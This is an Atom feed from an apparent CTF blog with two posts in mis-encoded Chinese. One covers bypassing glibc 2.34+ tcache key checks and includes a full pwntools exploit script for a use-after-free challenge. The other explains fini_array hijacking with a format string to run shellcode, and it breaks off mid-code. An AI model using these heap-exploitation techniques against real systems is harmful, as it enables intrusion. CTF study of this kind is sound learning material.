<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ğŸ¤£Thir0thçš„å–µå–µæ‚è´§é“ºğŸ¤£</title>
  
  
  <link href="https://www.thir0th.xyz/atom.xml" rel="self"/>
  
  <link href="https://www.thir0th.xyz/"/>
  <updated>2025-04-19T16:29:12.218Z</updated>
  <id>https://www.thir0th.xyz/</id>
  
  <author>
    <name>Thir0th</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2.34çš„keyå¼‚æˆ–ç»•è¿‡</title>
    <link href="https://www.thir0th.xyz/posts/f484160.html"/>
    <id>https://www.thir0th.xyz/posts/f484160.html</id>
    <published>2025-04-19T16:28:22.000Z</published>
    <updated>2025-04-19T16:29:12.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2-34çš„keyå¼‚æˆ–ç»•è¿‡"><a href="#2-34çš„keyå¼‚æˆ–ç»•è¿‡" class="headerlink" title="2.34çš„keyå¼‚æˆ–ç»•è¿‡"></a>2.34çš„keyå¼‚æˆ–ç»•è¿‡</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731408768499-51dea875-b6af-410f-84b3-cd651d6913ec.png" alt=""></p><p>2.34å¼•å…¥</p><p>å½“tcachebinä¸­</p><p>åªæœ‰ä¸€ä¸ªå †å—çš„æ—¶å€™ï¼Œkeyåœ¨å †å—çš„fdä½</p><p>å¦‚æœæœ‰å¤šä¸ªçš„è¯ï¼Œkeyåœ¨tcachebinå°¾å †å—çš„fdä½ï¼Œå› ä¸ºä¹‹å‰çš„fdä¼šè¢«åŠ å¯†ï¼Œå› ä¸ºtcachebinå †æŒ‡é’ˆå¼‚æˆ–åŠ å¯†</p><h3 id="tcache-key-æ ¡éªŒæœºåˆ¶"><a href="#tcache-key-æ ¡éªŒæœºåˆ¶" class="headerlink" title="tcache key æ ¡éªŒæœºåˆ¶"></a><font style="color:rgb(51, 51, 51);">tcache key æ ¡éªŒæœºåˆ¶</font></h3><font style="color:rgb(51, 51, 51);">æ­¤å¤„ä»¥libc-2.29æºç æ–‡ä»¶malloc.cæ¥è¿›è¡Œæœºåˆ¶ä»‹ç»</font><font style="color:rgb(51, 51, 51);">tcacheçš„åˆ†é…ä½äº__libc_mallocå‡½æ•°ï¼Œç›¸å…³ä»£ç ï¼š</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  /* int_free also calls request2size, be careful to not pad twice.  */</span><br><span class="line">  size_t tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  size_t tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><font style="color:rgb(51, 51, 51);">æ­¤å¤„tbytesæ˜¯è¯·æ±‚çš„chunkå¤§å°ï¼Œtc_idxæ˜¯å¯¹åº”ä¿å­˜tcacheé“¾è¡¨æ•°ç»„çš„ç´¢å¼•ï¼Œç”³è¯·æ“ä½œä¸­è¿›è¡Œäº†ä¸€ä¸ªæ£€æŸ¥ï¼šæ£€æŸ¥ç›®æ ‡é“¾è¡¨æ˜¯ä¸æ˜¯ç©ºçš„ï¼Œä¸æ˜¯ç©ºçš„å°±åˆ†é…</font><font style="color:rgb(51, 51, 51);">tcacheçš„é‡Šæ”¾ä½äº_int_freeå‡½æ•°ï¼Œç›¸å…³ä»£ç ï¼š</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line">    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">    /* Check to see if it&#x27;s already in the tcache.  */</span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">    /* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="line">       trust it (it also matches random payload data at a 1 in</span><br><span class="line">       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="line">       coincidence before aborting.  */</span><br><span class="line">    if (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span><br><span class="line">        for (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">          if (tmp == e)</span><br><span class="line">        malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span><br><span class="line">        /* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="line">           few cycles, but don&#x27;t abort.  */</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><font style="color:rgb(51, 51, 51);">å…ˆåˆ¤æ–­e->keyæ˜¯ä¸æ˜¯tcacheï¼Œæ˜¯çš„è¯ï¼Œå°±è¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œéå†è¯¥chunkæ‰€åœ¨é“¾è¡¨æ‰€æœ‰çš„chunkåˆ¤æ–­æ˜¯å¦ä¸é‡Šæ”¾çš„chunkåœ°å€ä¸€è‡´ï¼Œä¸€è‡´åˆ™ç›¸åŒ</font><font style="color:rgb(51, 51, 51);">å…³äºe->keyä¸ºä»€ä¹ˆä¼šæ˜¯tcacheï¼Œåœ¨tcache_putå‡½æ•°ä¸­æœ‰ä½“ç°ï¼š</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="line">   for more chunks.  */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="line">     detect a double free.  */</span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><font style="color:rgb(51, 51, 51);">è¯¥ç‰ˆæœ¬ä¸­ï¼Œé‡Šæ”¾çš„chunkä¼šå°†tcacheå†™å…¥keyå­—æ®µä¸­ï¼Œç„¶åå°±æ˜¯é“¾è¡¨å¤´æ’èŠ‚ç‚¹ï¼Œæ•°é‡åŠ ä¸€</font><h3 id="ç»•è¿‡åˆ†æ"><a href="#ç»•è¿‡åˆ†æ" class="headerlink" title="ç»•è¿‡åˆ†æ"></a><font style="color:rgb(51, 51, 51);">ç»•è¿‡åˆ†æ</font></h3><font style="color:rgb(51, 51, 51);">keyæ ¡éªŒæœºåˆ¶çš„å…³é”®ç‚¹æœ‰2ä¸ªï¼šæ ¡éªŒkeyå€¼ï¼Œæ˜¯å¦ç­‰äºtcacheç»“æ„ä½“åœ°å€</font><ul><li><font style="color:rgb(51, 51, 51);">ä¸ç­‰äºçš„è¯ï¼Œå°±ç›´æ¥æ­£å¸¸é‡Šæ”¾</font></li><li><font style="color:rgb(51, 51, 51);">ç­‰äºçš„è¯ï¼Œ</font>**<font style="color:rgb(51, 51, 51);">éå†å¯¹åº”å¤§å°çš„é“¾è¡¨</font>**<font style="color:rgb(51, 51, 51);">æ£€æŸ¥æ˜¯å¦å­˜åœ¨Double-Free</font></li></ul><font style="color:rgb(51, 51, 51);">å¸¸è§„çš„ç»•è¿‡keyæœºåˆ¶çš„æ–¹å¼æ˜¯ä¿®æ”¹keyå­—æ®µï¼Œå¸¸è§é€šè¿‡Overflowæˆ–è€…UAFæˆ–è€…æ³„éœ²æ¥å®Œæˆ</font><font style="color:rgb(51, 51, 51);">heap_addr=key<<12</font><h3 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a><font style="color:rgb(51, 51, 51);">ç»•è¿‡æ–¹æ³•</font></h3><h4 id="æ³„éœ²"><a href="#æ³„éœ²" class="headerlink" title="æ³„éœ²"></a>æ³„éœ²</h4><p>å½“å­˜åœ¨uafçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ³„éœ²keyï¼Œå°±å¯ä»¥ç»•è¿‡</p><p>ä¿®æ”¹fdä½ï¼šxor_free_hook=free_hook^key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(key))</span><br><span class="line">heap_base=(key&lt;&lt;<span class="number">12</span>)-<span class="number">0x1000</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">flag_xor=flag^key</span><br><span class="line">edit(<span class="number">0</span>,p64(flag_xor-<span class="number">0x10</span>))</span><br></pre></td></tr></table></figure><p>ä¾‹é¢˜</p><p>flagè¢«è¯»å…¥0x4060ï¼Œå¹¶ç»™å‡ºpie_base</p><p>add,edit,show,freeå››ä¸ªåŠŸèƒ½å‡½æ•°</p><p>2.35ç‰ˆæœ¬ï¼Œuaf</p><p>uafæ³„éœ²å‡ºkeyä¹‹åtcachebin attack å°†flagå †å—ç”³è¯·å‡ºæ¥ï¼Œshowå°±å¯ä»¥å¾—åˆ°flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731410367915-aae1ee10-12f0-4e23-ae52-ecfdb3fe86ae.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731410389619-0bc1b17a-3938-4338-a614-d6281c944a5b.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pie_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1a44</span></span><br><span class="line">li(<span class="built_in">hex</span>(pie_base))</span><br><span class="line">flag=pie_base+<span class="number">0x4060</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;input size&gt;&gt;&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line">rl(<span class="string">&quot;input data&gt;&gt;&quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;input data&gt;&gt;&quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">s(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">s(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">rl(<span class="string">&quot;data&gt;&gt;\n&quot;</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(key))</span><br><span class="line">heap_base=(key&lt;&lt;<span class="number">12</span>)-<span class="number">0x1000</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">flag_xor=flag^key</span><br><span class="line">edit(<span class="number">0</span>,p64(flag_xor-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="House-of-Karui"><a href="#House-of-Karui" class="headerlink" title="House of Karui"></a><font style="color:rgb(34, 34, 38);">House of Karui</font></h4><p><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/142422852">ã€æˆ‘çš„ PWN å­¦ä¹ æ‰‹æœ­ã€‘House of Karui â€”â€” tcache key ç»•è¿‡_tcache keyæ€ä¹ˆæ‰¾-CSDNåšå®¢</a></p>]]></content>
    
    
    <summary type="html">2.34çš„keyå¼‚æˆ–ç»•è¿‡</summary>
    
    
    
    <category term="chunk" scheme="https://www.thir0th.xyz/categories/chunk/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fini_arrayåŠ«æŒ</title>
    <link href="https://www.thir0th.xyz/posts/6db984ee.html"/>
    <id>https://www.thir0th.xyz/posts/6db984ee.html</id>
    <published>2025-04-19T16:18:35.000Z</published>
    <updated>2025-04-19T16:18:39.779Z</updated>
    
    <content type="html"><![CDATA[<h1 id="éæ ˆä¸ŠfmtåŠ«æŒ"><a href="#éæ ˆä¸ŠfmtåŠ«æŒ" class="headerlink" title="éæ ˆä¸ŠfmtåŠ«æŒ"></a>éæ ˆä¸ŠfmtåŠ«æŒ</h1><p><a href="https://www.cnblogs.com/seyedog/p/17891490.html">https://www.cnblogs.com/seyedog/p/17891490.html</a></p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>ç¨‹åºæ‰§è¡Œæµç¨‹å›¾ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713479270-56b817f8-817e-4336-8cfc-fb463d07ff76.png" alt=""></p><p>å‡½æ•°æœ€ç»ˆexité€€å‡ºæ—¶ä¼šè°ƒç”¨fini_arrayå‡½æ•°ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶fini_arrayï¼Œå°±å¯ä»¥åŠ«æŒç¨‹åºæµç¨‹</p><p>dl_finiå‡½æ•°</p><p>main-&gt;exit-&gt;<strong><font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">__run_exit_handlers-&gt;dl_fini</font></strong></p><p><strong><font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">dl_finiå‡½æ•°ä¸­ä¼šè°ƒç”¨call rax</font></strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713632424-eb86c69d-1e65-4f80-9900-29dcc570b6d2.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶l_addrï¼Œæµ…ç´«è‰²ä¸ºæ®‹å­˜ä¸‹æ¥çš„l_addråœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨fmtå»ä¿®æ”¹è¿™ä¸ªæ•°å€¼,åŠ«æŒç¨‹åºè¿”å›åˆ°tar_addr</p><p>åç§»è®¡ç®—ï¼šåç§»=tar_addr-fini_arry_addr</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714211462-96e208c7-58cc-4585-b1d7-783926810183.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713703387-c634b302-5b6f-49d0-80a2-e0d1acf6cde7.png" alt=""></p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>2023é‡‘ç›¾æ¯çš„ä¸€é“é¢˜</p><p>è¿™é‡Œæœ‰close(1)ï¼Œæ²¡åŠæ³•è¾“å‡ºï¼Œè¿™æ ·æˆ‘ä»¬åç§»å°±ä¸å¥½æ‰¾ï¼ŒåŒæ—¶å¼€å¯æ²™ç›’ï¼Œåªæœ‰ä¸€æ¬¡éæ ˆä¸Šfmt</p><p>æ€è·¯ï¼šç›´æ¥ç”¨åˆ°fini_arrayåŠ«æŒï¼Œ<font style="color:rgb(34, 34, 34);">é€šè¿‡ä¿®æ”¹dl_finiæ•°ç»„é‡Œçš„åç§»å€¼ï¼Œä½¿å‡½æ•°åœ¨é€€å‡ºæ—¶æ‰§è¡Œæˆ‘ä»¬å†™åœ¨bssæ®µä¸Šçš„shellcode</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726382942358-8ae4fc44-76b3-43d2-b127-440e1a7796b5.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713136255-e1963cea-ee23-4e3d-8647-cb61f1d88020.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥å°†close(1) ä¿®æ‰ï¼Œnopæ‰</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714408563-9e64ff30-ca94-4dc3-8fea-82f55aa9114b.png" alt=""></p><p>å®Œæˆï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714480116-3a82770d-a9df-4543-b4fa-23118d0347d2.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714489260-968affba-4ab2-4af7-95a2-c0f3e134fa7b.png" alt=""></p><p>ä¿å­˜</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714515960-fde24aba-0ecd-4a5a-82d2-8e6e2fdc83e2.png" alt=""></p><p>åç§»è®¡ç®—</p><p>åç§»=shellcode_addr-fini_addr</p><font style="color:rgb(34, 34, 34);">0x40406B - 0x403D98 = 723</font><font style="color:rgb(34, 34, 34);">ä¿®æ”¹çš„åŒæ—¶è¯»å…¥orw shellcode</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 